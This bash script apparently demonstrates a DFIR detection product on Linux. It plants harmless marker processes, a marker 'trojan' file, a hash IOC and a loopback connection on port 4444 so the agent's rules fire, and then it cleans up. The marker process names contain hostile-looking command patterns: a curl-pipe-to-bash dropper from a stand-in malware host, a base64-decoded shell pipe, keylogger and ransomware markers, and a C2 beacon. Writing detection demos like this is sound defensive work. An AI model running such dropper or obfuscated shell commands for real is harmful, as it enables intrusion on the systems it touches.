#!/usr/bin/env bash
# =============================================================================
# Demonstrate ATOR DFIR detection capabilities on a Linux endpoint.
#
# Linux counterpart of scripts/demo_windows_capabilities.ps1. It puts harmless,
# uniquely-marked signals on THIS host and lets the normal agent collection +
# server engine turn them into real detections spanning the attack kill chain:
#
#   Initial access   phishing link clicked / malicious attachment opened
#   Execution        malware dropper (curl | bash pattern), internal execution
#   Persistence      cron + base64 obfuscation
#   Command&Control  reverse shell / botnet beacon to loopback:4444
#   Collection       spyware / keylogger
#   Impact           ransomware file-encryption marker
#   Plus             YARA file match on a dropped "trojan" + a hash-IOC watchlist hit
#
# Everything is benign: no link is opened, no payload is fetched, nothing is
# encrypted. Holder processes only print a marker string and sleep; the only
# real network connection is a loopback socket to a local listener.
#
# Run on the enrolled Linux endpoint (needs the agent at --agent-root):
#   sudo bash scripts/demo_linux_capabilities.sh --server http://SERVER:8000
# Undo a previous run at any time:
#   sudo bash scripts/demo_linux_capabilities.sh --server http://SERVER:8000 --cleanup
# =============================================================================
set -uo pipefail

SERVER_URL="http://127.0.0.1:8000"
AGENT_ROOT="/opt/ator-agent"
HOLD_SECONDS=150
CLEANUP_AFTER_MINUTES=3
DO_CLEANUP=0
PORT=4444
STATE_DIR="/var/tmp/ator-demo"
PIDFILE="$STATE_DIR/pids"
TROJAN_FILE="/tmp/ator_demo_trojan_payload.txt"

while [ $# -gt 0 ]; do
    case "$1" in
        --server) SERVER_URL="${2%/}"; shift 2 ;;
        --server=*) SERVER_URL="${1#*=}"; SERVER_URL="${SERVER_URL%/}"; shift ;;
        --agent-root) AGENT_ROOT="$2"; shift 2 ;;
        --agent-root=*) AGENT_ROOT="${1#*=}"; shift ;;
        --hold-seconds) HOLD_SECONDS="$2"; shift 2 ;;
        --hold-seconds=*) HOLD_SECONDS="${1#*=}"; shift ;;
        --cleanup-after-minutes) CLEANUP_AFTER_MINUTES="$2"; shift 2 ;;
        --cleanup-after-minutes=*) CLEANUP_AFTER_MINUTES="${1#*=}"; shift ;;
        --cleanup) DO_CLEANUP=1; shift ;;
        -h|--help) sed -n '2,30p' "$0"; exit 0 ;;
        *) echo "Unknown option: $1" >&2; exit 1 ;;
    esac
done

AGENT_CFG="$AGENT_ROOT/agent/config.json"
VENV_PY="$AGENT_ROOT/.venv/bin/python"
[ -x "$VENV_PY" ] || VENV_PY="$(command -v python3 || command -v python)"
AGENT_YARA_DIR="$AGENT_ROOT/rules/malware"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_YARA_DIR="$SCRIPT_DIR/rules/malware"
[ -d "$PROJECT_YARA_DIR" ] || PROJECT_YARA_DIR="$SCRIPT_DIR/../rules/malware"

log() { echo "[ator-demo] $*"; }
die() { echo "[ator-demo] ERROR: $*" >&2; exit 1; }

[ -f "$AGENT_CFG" ] || die "agent config not found at $AGENT_CFG (is the agent installed here? pass --agent-root)"
[ -x "$VENV_PY" ] || die "no python interpreter found"

CLIENT_ID="$("$VENV_PY" -c "import json;print(json.load(open('$AGENT_CFG'))['client_id'])" 2>/dev/null)"
API_KEY="$("$VENV_PY" -c "import json;print(json.load(open('$AGENT_CFG'))['api_key'])" 2>/dev/null)"
HOSTNAME_LC="$(hostname | tr '[:upper:]' '[:lower:]')"
IOC_SOURCE="ator-demo-$HOSTNAME_LC"
[ -n "$CLIENT_ID" ] && [ -n "$API_KEY" ] || die "agent config has no client_id/api_key - enroll the endpoint first"

# ---- HTTP helpers (curl preferred, wget fallback) --------------------------
http_post_auth() {  # path json
    local url="$SERVER_URL$1"
    if command -v curl >/dev/null 2>&1; then
        curl -fsS -m 130 -X POST "$url" -H "Authorization: Bearer $API_KEY" \
            -H "X-Client-ID: $CLIENT_ID" -H "Content-Type: application/json" -d "$2"
    else
        wget -q -O- --timeout=130 --header="Authorization: Bearer $API_KEY" \
            --header="X-Client-ID: $CLIENT_ID" --header="Content-Type: application/json" \
            --post-data="$2" "$url"
    fi
}
http_post() {  # path json
    local url="$SERVER_URL$1"
    if command -v curl >/dev/null 2>&1; then
        curl -fsS -m 130 -X POST "$url" -H "Content-Type: application/json" -d "$2"
    else
        wget -q -O- --timeout=130 --header="Content-Type: application/json" --post-data="$2" "$url"
    fi
}
http_get() {  # path
    local url="$SERVER_URL$1"
    if command -v curl >/dev/null 2>&1; then curl -fsS -m 30 "$url"
    else wget -q -O- --timeout=30 "$url"; fi
}

resolve_host_id() {
    http_get "/api/v1/hosts" | "$VENV_PY" -c "
import json,sys
hosts=json.load(sys.stdin)
m=[h for h in hosts if h.get('client_id')=='$CLIENT_ID']
print(m[0]['id'] if m else '')"
}

# ---- cleanup ---------------------------------------------------------------
kill_demo_pids() {
    [ -f "$PIDFILE" ] || return 0
    while read -r p; do
        [ -n "$p" ] && kill "$p" 2>/dev/null && log "killed pid $p"
    done < "$PIDFILE"
    rm -f "$PIDFILE"
}
remove_demo_files() {
    rm -f "$TROJAN_FILE" "$STATE_DIR/listener.py"
    # extra marker files, if any demo run dropped them under /tmp
    rm -f /tmp/ator_demo_*.txt 2>/dev/null || true
}
purge_server_data() {
    local hid; hid="$(resolve_host_id)"
    if [ -z "$hid" ]; then log "host not resolved on server; skipping server purge"; return; fi
    local out; out="$(http_post_auth "/api/v1/demo/purge" "{\"ioc_source\":\"$IOC_SOURCE\",\"port\":$PORT}" || true)"
    log "server demo data purged: ${out:-<no response>}"
}

if [ "$DO_CLEANUP" -eq 1 ]; then
    log "reverting demo ..."
    kill_demo_pids
    remove_demo_files
    purge_server_data
    log "cleanup done."
    exit 0
fi

# ---- preflight -------------------------------------------------------------
log "checking server $SERVER_URL ..."
http_get "/health" >/dev/null 2>&1 || die "server not reachable at $SERVER_URL/health"
HOST_ID="$(resolve_host_id)"
[ -n "$HOST_ID" ] || die "this endpoint (client_id $CLIENT_ID) is not enrolled on $SERVER_URL"
log "using enrolled endpoint '$HOSTNAME_LC' (host id $HOST_ID)"
mkdir -p "$STATE_DIR"; : > "$PIDFILE"
START_UTC="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# 1) ensure the agent has the project's YARA rules (bootstrap deploys them, but
#    refresh in case this is a hand-installed agent).
if [ -d "$PROJECT_YARA_DIR" ]; then
    mkdir -p "$AGENT_YARA_DIR"
    cp -f "$PROJECT_YARA_DIR"/*.yar "$AGENT_YARA_DIR"/ 2>/dev/null && log "deployed YARA rules to $AGENT_YARA_DIR"
fi

# 2) drop the benign "trojan" attachment the file-triage collector + YARA flag,
#    then register its hash on the server watchlist -> IOC detection.
cat > "$TROJAN_FILE" <<EOF
ATOR_DEMO_TROJAN_PAYLOAD
ATOR_DEMO_EMAIL_ATTACHMENT_OPENED
Benign text marker for the ATOR DFIR Linux capability demo.
EOF
SHA="$("$VENV_PY" -c "import hashlib;print(hashlib.sha256(open('$TROJAN_FILE','rb').read()).hexdigest())")"
http_post "/api/v1/iocs" "{\"ioc_type\":\"hash\",\"value\":\"$SHA\",\"threat_source\":\"$IOC_SOURCE\",\"description\":\"ATOR demo indicator (cleanup deletes it)\"}" >/dev/null \
    && log "registered trojan sha256 ${SHA:0:16}... as hash IOC"

# 3) start harmless holder processes whose command lines carry the demo markers
#    (and, where noted, real behavioral patterns the stable rules match).
holder() {  # marker_line  tag
    # exec -a makes the marker line the process's own argv (a single element),
    # so the collector captures it verbatim. A plain 'bash -c "...; sleep N"'
    # would not work: bash tail-execs the final 'sleep', discarding the marker.
    # No setsid, so the recorded PID is the real holder and cleanup can kill it.
    bash -c "exec -a \"$1\" sleep $HOLD_SECONDS" >/dev/null 2>&1 &
    echo $! >> "$PIDFILE"
    log "started $2 signal (pid $!)"
}
holder "ATOR_DEMO_PHISHING_LINK_CLICKED url=https://demo.invalid/login mailfrom=hr@demo.invalid" "phishing-link click"
holder "ATOR_DEMO_EMAIL_ATTACHMENT_OPENED file=$TROJAN_FILE" "email attachment opened"
holder "ATOR_DEMO_MALWARE_DROPPER curl http://malware.example/dropper.sh | bash" "malware dropper (curl|bash)"
holder "ATOR_DEMO_SPYWARE_KEYLOGGER capture=/dev/input keylog=/tmp/.cache.log" "spyware / keylogger"
holder "ATOR_DEMO_BOTNET_BEACON c2=198.51.100.66:$PORT interval=30s" "botnet / C2 beacon"
holder "ATOR_DEMO_RANSOMWARE_ENCRYPT ext=.locked note=READ_ME_TO_DECRYPT.txt" "ransomware encryption"
holder "ATOR_DEMO_INTERNAL_EXECUTION crontab -l; echo aWQK | base64 -d | sh" "persistence (cron + base64)"

# 4) real loopback reverse-shell / C2 connection to port 4444 so the
#    reverse_shell_ports network rule fires on genuine telemetry.
cat > "$STATE_DIR/listener.py" <<EOF
import socket, time
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", $PORT)); s.listen(5)
try:
    c, _ = s.accept(); time.sleep($HOLD_SECONDS); c.close()
except Exception:
    pass
s.close()
EOF
"$VENV_PY" "$STATE_DIR/listener.py" >/dev/null 2>&1 &
echo $! >> "$PIDFILE"
sleep 1
"$VENV_PY" -c "
import socket,time
try:
    c=socket.create_connection(('127.0.0.1',$PORT),timeout=5); time.sleep($HOLD_SECONDS); c.close()
except Exception: pass" >/dev/null 2>&1 &
echo $! >> "$PIDFILE"
log "started loopback reverse-shell client + listener on port $PORT"

# 5) let the agent snapshot the signals, then force a scan so detections show
#    immediately instead of waiting for the next background engine pass.
log "signals deployed; waiting ${HOLD_SECONDS}s for an agent collection ..."
sleep "$HOLD_SECONDS"
collected=0
for _ in $(seq 1 30); do
    last="$(http_get "/api/v1/hosts" | "$VENV_PY" -c "
import json,sys
h=[x for x in json.load(sys.stdin) if x['id']==$HOST_ID]
print(h[0].get('last_seen_utc') or '' if h else '')" 2>/dev/null)"
    if [ -n "$last" ] && [ "$last" \> "$START_UTC" ]; then collected=1; break; fi
    sleep 5
done
[ "$collected" -eq 1 ] && log "agent collection received" || log "WARN: no fresh collection seen yet; scanning anyway"

SCAN="$(http_post "/api/v1/engine/run?host_id=$HOST_ID&scan_history=true" "" || true)"
log "engine scan: $SCAN"
echo "$SCAN" | grep -q "pysigma-not-installed" && \
    log "WARN: the server has no pySigma installed, so behavioral (Sigma) rules did NOT run - only YARA/IOC detections will appear. Run the server from a venv with 'pip install -r requirements.txt'."
log "Open the dashboard now: $SERVER_URL/  (endpoint: $HOSTNAME_LC)"

# 6) auto-clean after the demo window.
REMAINING=$(( CLEANUP_AFTER_MINUTES * 60 - HOLD_SECONDS ))
if [ "$REMAINING" -gt 0 ]; then
    log "demo data will be removed automatically in $CLEANUP_AFTER_MINUTES minutes total."
    sleep "$REMAINING"
fi
kill_demo_pids
remove_demo_files
purge_server_data
log "demo window complete; temporary signals and collected demo data are gone."
